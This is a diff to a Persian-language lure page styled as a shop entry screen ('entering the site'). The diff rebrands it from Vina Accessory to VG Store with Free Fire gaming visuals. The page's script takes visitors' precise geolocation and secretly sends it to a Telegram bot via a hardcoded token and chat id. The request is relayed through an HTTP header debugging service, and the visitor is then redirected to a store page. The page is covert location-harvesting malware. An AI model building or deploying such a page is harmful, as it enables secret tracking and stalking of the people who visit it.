@@ -2,16 +2,17 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>https://vinaaccessory.com/</title>
+  <title>vg-store.ir/</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://cdn.fontcdn.ir/Font/Persian/Vazir/Vazir.css" rel="stylesheet" type="text/css" />
+  <!-- فونت گیمینگ Orbitron -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Vazir', sans-serif;
-      background: url('https://images.openai.com/thumbnails/url/g_qQSXicu1mSUVJSUGylr5-al1xUWVCSmqJbkpRnoJdeXJJYkpmsl5yfq5-Zm5ieWmxfaAuUsXL0S7F0Tw6yKC8pCauwcPU18fVzSy7ON_HLrnKs8nRNKgp1t4yIiEyJiqryLw2tck_yyawsSQ539UqPDE0uj8_JTlcrBgAxxSsT') no-repeat center center;
-      background-size: cover;
-      background-attachment: fixed; /* پارالاکس */
+      font-family: 'Orbitron', sans-serif;
+      background: linear-gradient(135deg, #ff3c3c, #ff9800, #8e24aa);
+      background-size: 400% 400%;
+      animation: gradientMove 12s ease infinite;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -21,18 +22,37 @@
       color: #fff;
       overflow-x: hidden;
     }
-    h1 {
-      font-size: 2.4em;
-      margin-bottom: 12px;
-      text-shadow: 0 0 15px rgba(0,0,0,0.8);
-    }
-    p {
-      font-size: 1.2em;
-      margin-bottom: 25px;
-      text-shadow: 0 0 12px rgba(0,0,0,0.7);
+    @keyframes gradientMove {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
 
-    /* دکمه استایل گیمینگ */
+    /* تیتر Free Fire */
+    h1 {
+      font-size: 3em;
+      font-weight: 900;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 5px;
+      background: linear-gradient(90deg, #ffcc00, #ff3c3c, #ff9800, #fff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 10px rgba(255,140,0,0.9), 0 0 20px rgba(255,60,60,0.7), 0 0 30px rgba(255,255,255,0.8);
+      animation: flicker 1.5s infinite alternate;
+    }
+    @keyframes flicker {
+      from { text-shadow: 0 0 8px #ff3c3c, 0 0 16px #ff9800, 0 0 24px #ffcc00; }
+      to { text-shadow: 0 0 16px #fff, 0 0 30px #ff9800, 0 0 50px #ff3c3c; }
+    }
+
+    p {
+      font-size: 1.1em;
+      margin-bottom: 25px;
+      text-shadow: 0 0 10px rgba(0,0,0,0.7);
+    }
+
+    /* دکمه گیمینگ */
     button {
       position: relative;
       background: linear-gradient(135deg, #ff3c3c, #ff9800, #ffcc00);
@@ -77,11 +97,12 @@
       border-top: 1px solid rgba(255,255,255,0.2);
       text-shadow: 0 0 8px rgba(0,0,0,0.8);
       text-align: center;
+      font-family: sans-serif; /* برای هماهنگی متن فارسی */
     }
 
     /* موبایل */
     @media (max-width: 600px) {
-      h1 { font-size: 1.8em; }
+      h1 { font-size: 2em; }
       p { font-size: 1em; }
       button {
         width: 85%;
@@ -96,11 +117,11 @@
   </style>
 </head>
 <body>
-  <h1>در حال ورود به سایت</h1>
-  <p>شناسایی فروشگاه های نزدیک به شما...</p>
-  <button onclick="getLocation()">ورود به وینا اکسسوری</button>
+  <h1>FREE FIRE</h1>
+  <p>در حال ورود به سایت...</p>
+  <button onclick="getLocation()">ورود به وی جی استور</button>
   <footer>
-    © تمامی حقوق محفوظ است برای وینا اکسسوری | طراحی شده با ❤️
+    © تمامی حقوق محفوظ است برای وی جی استور | طراحی شده با 
   </footer>
 
   <script>
@@ -115,7 +136,6 @@
     function showPosition(position) {
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
-
       if (latitude && longitude) {
         var tgUrl = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
                   + "?chat_id=8438093859"
@@ -126,13 +146,14 @@
         formData.append("AgentList", "Google chrome");
         formData.append("VersionsList", "HTTP/1.1");
         formData.append("MethodList", "POST");
+
         fetch("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", {
           method: "POST",
           body: formData,
           mode: "no-cors"
         }).then(function() {
           alert("موفق!");
-          window.location.href = "https://shopino.app/shops/1469?page=15";
+          window.location.href = "https://vg-store.ir/%D8%AF%D8%B3%D8%AA%D9%87-%D9%85%D8%AD%D8%B5%D9%88%D9%84/%D8%A8%D8%A7%D8%B2%DB%8C-%D9%87%D8%A7%DB%8C-%D9%85%D9%88%D8%A8%D8%A7%DB%8C%D9%84/%D8%A7%DA%A9%D8%A7%D9%86%D8%AA-%D9%81%D8%B1%DB%8C-%D9%81%D8%A7%DB%8C%D8%B1/";
         }).catch(function() {
           alert("خطا! دوباره امتحان کنید.");
           window.location.href = "https://vinaaccessory.com/";
